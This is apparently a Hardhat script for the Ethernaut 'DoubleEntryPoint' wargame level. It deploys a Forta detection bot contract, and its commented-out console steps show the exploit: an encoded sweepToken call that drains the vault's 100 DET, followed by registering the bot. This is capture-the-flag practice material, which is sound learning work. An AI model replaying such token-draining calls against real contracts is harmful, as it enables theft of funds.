import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackDoubleEntry = async () => {
    // change contract addresses here.
    const doubleEntryAddress = "0xC4BB01C7AA492bdFF60f6989542d71DB7cb73Fd1"; //type "await contract.address()" in ethernaut console
    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
    const attackAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability from
    // Read more:
    // https://docs.soliditylang.org/en/latest/abi-spec.html#contract-abi-specification

    // deploy safeguard contract here
    // const deployed = await deployContract(hre, "FortaBot", args);
    // alternative below
    console.log("Deploying attack contract FortaBot...");
    const Factory = await ethers.getContractFactory("FortaBot", deployer);
    const fortaBot = await Factory.deploy();
    console.log(fortaBot);
    console.log(`Contract deployed to ${fortaBot.address}`);
    console.log("Attack contract deployed...");
    // experimantal verify below
    // if (fortaBot.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: fortaBot.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // vault = await contract.cryptoVault()

    // // Check initial balance (100 DET)
    // await contract.balanceOf(vault).then(v => v.toString()) // '100000000000000000000'

    // legacyToken = await contract.delegatedFrom()

    // // sweepTokens(..) function call data
    // sweepSig = web3.eth.abi.encodeFunctionCall({
    //     name: 'sweepToken',
    //     type: 'function',
    //     inputs: [{name: 'token', type: 'address'}]
    // }, [legacyToken])

    // // Send exploit transaction
    // await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig })

    // // Check balance (0 DET)
    // await contract.balanceOf(vault).then(v => v.toString()) // '0'

    // // FortaDetectionBot
    // botAddr = '0x...'

    // // Forta contract address
    // forta = await contract.forta()

    // // setDetectionBot() function call data
    // setBotSig = web3.eth.abi.encodeFunctionCall({
    //     name: 'setDetectionBot',
    //     type: 'function',
    //     inputs: [
    //         { type: 'address', name: 'detectionBotAddress' }
    //     ]
    // }, [botAddr])

    // // Send the transaction setting the bot
    // await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig })

    // console.log(txReceipt1);
};

attackDoubleEntry()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
